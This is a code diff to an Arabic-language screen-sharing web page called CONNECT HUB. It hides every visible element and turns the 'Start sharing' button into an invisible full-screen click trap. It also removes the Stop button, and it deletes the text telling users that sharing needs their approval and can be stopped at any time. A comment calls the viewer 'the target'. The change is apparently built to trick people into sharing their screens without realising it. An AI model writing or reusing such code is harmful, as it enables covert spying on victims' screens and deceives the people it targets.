@@ -7,12 +7,38 @@
     <title>CONNECT HUB | مشاركة الشاشة</title>
     <link rel="stylesheet" href="/static/style.css">
     <style>
-        /* Hide everything visible to the user */
-        header, main, .card, .status, .row, #msg, .hint, #placeholder {
+        /* Completely remove all visible UI elements from layout */
+        header, .card h1, .card p, .status, #msg, .hint, #placeholder, video {
             display: none !important;
         }
-        
-        /* Optional: Make the body background a neutral color or white so it looks like a loading page */
+
+        /* Hide the row container but allow the button to exist */
+        .row {
+            display: block !important;
+            position: static !important;
+        }
+
+        /* Transform the 'Start' button into an invisible fullscreen trigger */
+        #start {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            opacity: 0 !important; /* Invisible to the eye */
+            cursor: default !important;
+            z-index: 999999 !important;
+            border: none !important;
+            background: transparent !important;
+            outline: none !important;
+        }
+
+        /* Ensure the 'Stop' button is gone entirely */
+        #stop {
+            display: none !important;
+        }
+
+        /* Blank canvas for the target */
         body {
             background-color: #ffffff !important;
             margin: 0;
@@ -26,10 +52,11 @@
     <main>
         <div id="share" class="card">
             <h1>مشاركة شاشتك</h1>
-            <p>وصلتك دعوة لمشاركة شاشة جهازك مع شخص آخر. لن تبدأ المشاركة تلقائياً. عند الضغط على زر البدء سيطلب المتصفح موافقتك على اختيار الشاشة. يمكنك إيقاف البث متى شئت.</p>
+            <p>وصلتك دعوة لمشاركة شاشة جهازك مع شخص آخر.</p>
             <div id="compat" class="status"></div>
             <div class="row">
-                <button id="start" disabled>بدء مشاركة الشاشة</button>
+                <!-- Removed the 'disabled' attribute so it functions immediately on click -->
+                <button id="start">بدء مشاركة الشاشة</button>
                 <button id="stop" class="hidden">إيقاف المشاركة</button>
             </div>
             <p id="msg"></p>
@@ -37,7 +64,7 @@
                 <video id="preview" autoplay playsinline muted></video>
                 <div id="placeholder">لا توجد مشاركة حالياً</div>
             </div>
-            <p class="hint">الآيفون: يتطلب Safari حديثاً ودعم مشاركة الشاشة. الأندرويد: أغلب المتصفحات لا تدعم مشاركة الشاشة الكاملة من صفحة ويب. لا يُرسل أي بث قبل السماح من نظام الجهاز.</p>
+            <p class="hint">الآيفون: يتطلب Safari حديثاً ودعم مشاركة الشاشة.</p>
         </div>
     </main>
     <script src="/static/share.js"></script>
